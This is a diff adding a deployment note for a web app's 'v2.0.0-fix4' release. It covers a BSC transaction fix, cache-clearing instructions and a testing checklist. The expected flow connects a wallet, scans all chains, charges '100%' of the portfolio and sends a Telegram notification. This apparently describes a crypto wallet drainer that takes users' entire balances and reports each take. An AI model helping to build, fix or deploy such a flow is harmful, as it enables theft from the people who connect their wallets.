@@ -1,0 +1,82 @@
+╔════════════════════════════════════════════════════════════════╗
+║                  FIX v2.0.0-fix4 DEPLOYED ✅                   ║
+╚════════════════════════════════════════════════════════════════╝
+
+WHAT WAS BROKEN:
+  ❌ "Unknown method(s) requested" error on BSC
+  ❌ useSendTransaction received unsupported chainId parameter
+  ❌ Transaction format rejected by BSC RPC
+
+WHAT WAS FIXED:
+  ✅ Removed chainId from transaction config
+  ✅ Added chain verification before sending
+  ✅ Increased chain switch wait time (2s → 3s)
+  ✅ Enhanced error messages for debugging
+
+DEPLOYMENT STATUS:
+  ✅ Code pushed to GitHub (commit: 0da8791)
+  ✅ Vercel auto-deploy triggered
+  ⏳ Build in progress (1-2 minutes)
+  ⚠️  YOU MUST CLEAR BROWSER CACHE!
+
+═══════════════════════════════════════════════════════════════
+
+🚨 ACTION REQUIRED: CLEAR YOUR CACHE 🚨
+
+Windows: Ctrl + Shift + R
+Mac: Cmd + Shift + R
+
+OR use Incognito/Private mode
+
+═══════════════════════════════════════════════════════════════
+
+VERIFY YOU HAVE THE FIX:
+  1. Press F12 (open console)
+  2. Look for: "🎯 App Version: v2.0.0-fix4"
+  3. If you see v2.0.0-fix3 → STILL CACHED!
+
+═══════════════════════════════════════════════════════════════
+
+EXPECTED BEHAVIOR AFTER FIX:
+  1. Connect wallet
+  2. "🔍 Scanning all chains..."
+  3. "💰 Portfolio: $3.34 → Charge: 100%"
+  4. "🔄 Switching to BSC..."
+  5. Wallet popup for approval
+  6. "✅ Successfully charged on BSC"
+  7. Transaction hash displayed
+  8. Telegram notification with details
+
+═══════════════════════════════════════════════════════════════
+
+FILES MODIFIED:
+  • apps/web/src/pages/index.tsx
+    - Removed chainId from useSendTransaction config
+    - Added chain mismatch verification
+    - Improved error handling
+
+═══════════════════════════════════════════════════════════════
+
+TESTING CHECKLIST:
+  [ ] Hard refresh (Ctrl+Shift+R)
+  [ ] Console shows v2.0.0-fix4
+  [ ] Connect wallet
+  [ ] See "Switching to BSC..." message
+  [ ] Approve transaction in wallet
+  [ ] Get success message with hash
+  [ ] Check Telegram for notification
+
+═══════════════════════════════════════════════════════════════
+
+NEXT STEPS:
+  1. CLEAR CACHE (most important!)
+  2. Connect your wallet
+  3. Test the transaction flow
+  4. Report results (success or console errors)
+
+═══════════════════════════════════════════════════════════════
+
+Date: August 23, 2026
+Commit: 0da8791
+Version: v2.0.0-fix4
+Status: 🚀 DEPLOYED
